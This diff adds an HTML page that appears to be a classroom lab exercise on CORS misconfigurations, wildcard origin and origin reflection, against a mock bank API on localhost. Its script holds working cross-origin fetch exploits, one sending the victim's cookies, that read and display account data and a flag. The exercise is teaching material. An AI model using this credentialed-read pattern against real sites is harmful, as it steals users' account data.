@@ -1,0 +1,207 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Ex 01 — Origin Reflection Exploit</title>
+  <style>
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+    body { font-family: 'Courier New', monospace; background: #0a0e1a; color: #e0e6f0; padding: 2rem; }
+    h1 { color: #ff3c3c; margin-bottom: 0.25rem; }
+    .subtitle { color: #6272a4; font-size: 0.85rem; margin-bottom: 2rem; }
+    .scenario {
+      background: #1a1225;
+      border: 1px solid #9945ff44;
+      border-left: 4px solid #9945ff;
+      padding: 1rem 1.25rem;
+      border-radius: 6px;
+      font-size: 0.82rem;
+      line-height: 1.6;
+      margin-bottom: 1.5rem;
+      color: #c0b0e0;
+    }
+    .attack-card {
+      background: #111827;
+      border: 1px solid #1f2d3d;
+      border-radius: 8px;
+      padding: 1.25rem;
+      margin-bottom: 1.25rem;
+    }
+    .attack-card h2 {
+      font-size: 0.95rem;
+      color: #ff6b6b;
+      margin-bottom: 0.5rem;
+      display: flex;
+      align-items: center;
+      gap: 0.6rem;
+    }
+    .badge {
+      background: #ff3c3c22;
+      border: 1px solid #ff3c3c44;
+      color: #ff6b6b;
+      font-size: 0.68rem;
+      padding: 0.15rem 0.5rem;
+      border-radius: 3px;
+    }
+    .explanation { font-size: 0.8rem; color: #6272a4; line-height: 1.6; margin-bottom: 0.75rem; }
+    .headers-preview {
+      background: #0d1117;
+      border: 1px solid #30363d;
+      border-radius: 4px;
+      padding: 0.6rem 0.75rem;
+      font-size: 0.75rem;
+      color: #8b949e;
+      margin-bottom: 0.75rem;
+      white-space: pre;
+    }
+    .headers-preview .key { color: #79c0ff; }
+    .headers-preview .val { color: #a5d6ff; }
+    .headers-preview .vuln { color: #ff6b6b; }
+    button {
+      background: #ff3c3c22;
+      border: 1px solid #ff3c3c66;
+      color: #ff6b6b;
+      padding: 0.45rem 1.2rem;
+      border-radius: 4px;
+      cursor: pointer;
+      font-size: 0.82rem;
+      font-family: inherit;
+      transition: background 0.15s;
+    }
+    button:hover { background: #ff3c3c33; }
+    .output {
+      background: #0d1117;
+      border-radius: 4px;
+      padding: 0.75rem;
+      font-size: 0.75rem;
+      min-height: 90px;
+      white-space: pre-wrap;
+      word-break: break-all;
+      margin-top: 0.75rem;
+      color: #6272a4;
+      border: 1px solid #21262d;
+    }
+    .flag {
+      background: #2d2a00;
+      border: 1px solid #f0c93a55;
+      color: #f0c93a;
+      padding: 0.5rem 0.75rem;
+      border-radius: 4px;
+      margin-top: 0.5rem;
+      font-size: 0.9rem;
+      font-weight: bold;
+    }
+    code { background: #1f2d3d; padding: 0.1rem 0.35rem; border-radius: 3px; font-size: 0.85em; }
+  </style>
+</head>
+<body>
+  <h1>Exercise 01 — Core Misconfigurations</h1>
+  <div class="subtitle">Bugs #1 (wildcard) and #2 (origin reflection) — live in your browser</div>
+
+  <div class="scenario">
+    <strong>Attacker scenario:</strong> You control this page at <code id="our-origin"></code>.
+    The victim bank API runs at <code>http://localhost:3000</code>. A victim user has a session
+    cookie set by the bank. They visit your malicious page. Your JavaScript runs silently and
+    exfiltrates their account data — without them seeing anything.
+  </div>
+
+  <!-- BUG #1 -->
+  <div class="attack-card">
+    <h2><span class="badge">BUG #1</span> Wildcard Origin (<code>Access-Control-Allow-Origin: *</code>)</h2>
+    <div class="explanation">
+      The server sends <code>*</code> as the allowed origin. Any website on the internet can read
+      this response. While browsers block <code>*</code> combined with credentials, this route
+      still leaks all its data to any unauthenticated cross-origin caller.
+    </div>
+    <div class="headers-preview"><span class="key">Request Origin:</span>  <span class="val">http://localhost:3002</span>
+<span class="key">Response header:</span> <span class="vuln">Access-Control-Allow-Origin: *</span>  ← any origin allowed</div>
+    <button onclick="exploitWildcard()">▶ Exploit — fetch /api/public as wildcard</button>
+    <div class="output" id="wildcard-output">Click to run...</div>
+  </div>
+
+  <!-- BUG #2 -->
+  <div class="attack-card">
+    <h2><span class="badge">BUG #2</span> Origin Reflection (your snippet from class)</h2>
+    <div class="explanation">
+      The server reads <code>req.headers.origin</code> and echoes it directly into
+      <code>Access-Control-Allow-Origin</code>. Combined with <code>Allow-Credentials: true</code>,
+      any website becomes a trusted origin. The browser sends the victim's session cookie,
+      and the attacker's page receives credentialed account data.
+    </div>
+    <div class="headers-preview"><span class="key">Request Origin:</span>  <span class="val">http://localhost:3002</span>  ← we are the attacker
+<span class="key">Response header:</span> <span class="vuln">Access-Control-Allow-Origin: http://localhost:3002</span>  ← reflected!
+<span class="key">Response header:</span> <span class="vuln">Access-Control-Allow-Credentials: true</span>  ← cookies included!</div>
+    <button onclick="exploitReflection()">▶ Exploit — fetch /api/account with credentials</button>
+    <div class="output" id="reflection-output">Click to run...</div>
+  </div>
+
+  <script>
+    document.getElementById('our-origin').textContent = window.location.origin;
+
+    async function exploitWildcard() {
+      const el = document.getElementById('wildcard-output');
+      el.style.color = '#6272a4';
+      el.textContent = 'Sending cross-origin GET to http://localhost:3000/api/public...\n';
+
+      try {
+        const res = await fetch('http://localhost:3000/api/public');
+        const acao = res.headers.get('access-control-allow-origin');
+        const data = await res.json();
+
+        el.style.color = '#ff6b6b';
+        el.textContent =
+          '⚠️  SUCCESS — data leaked!\n\n' +
+          'Response header: Access-Control-Allow-Origin: ' + acao + '\n' +
+          'Status: ' + res.status + '\n\n' +
+          'Data received:\n' + JSON.stringify(data, null, 2);
+
+        if (data.flag) {
+          const f = document.createElement('div');
+          f.className = 'flag';
+          f.textContent = '🚩 FLAG: ' + data.flag;
+          document.getElementById('wildcard-output').after(f);
+        }
+      } catch (err) {
+        el.style.color = '#3fb950';
+        el.textContent = '✅ Blocked: ' + err.message + '\n\nBug #1 has been fixed!';
+      }
+    }
+
+    async function exploitReflection() {
+      const el = document.getElementById('reflection-output');
+      el.style.color = '#6272a4';
+      el.textContent =
+        'Sending cross-origin GET to http://localhost:3000/api/account...\n' +
+        'Our origin: ' + window.location.origin + '\n' +
+        'credentials: "include" → browser will send session cookie\n\n';
+
+      try {
+        const res = await fetch('http://localhost:3000/api/account', {
+          credentials: 'include',
+        });
+
+        const acao  = res.headers.get('access-control-allow-origin');
+        const acac  = res.headers.get('access-control-allow-credentials');
+        const data  = await res.json();
+
+        el.style.color = '#ff6b6b';
+        el.textContent =
+          '🔥 CRITICAL — credentialed cross-origin read succeeded!\n\n' +
+          'Server reflected our origin back:\n' +
+          '  Access-Control-Allow-Origin: ' + acao + '\n' +
+          '  Access-Control-Allow-Credentials: ' + acac + '\n\n' +
+          'Account data exfiltrated:\n' + JSON.stringify(data, null, 2);
+
+        if (data.flag) {
+          const f = document.createElement('div');
+          f.className = 'flag';
+          f.textContent = '🚩 FLAG: ' + data.flag;
+          document.getElementById('reflection-output').after(f);
+        }
+      } catch (err) {
+        el.style.color = '#3fb950';
+        el.textContent = '✅ Blocked: ' + err.message + '\n\nBug #2 has been fixed!';
+      }
+    }
+  </script>
+</body>
+</html>
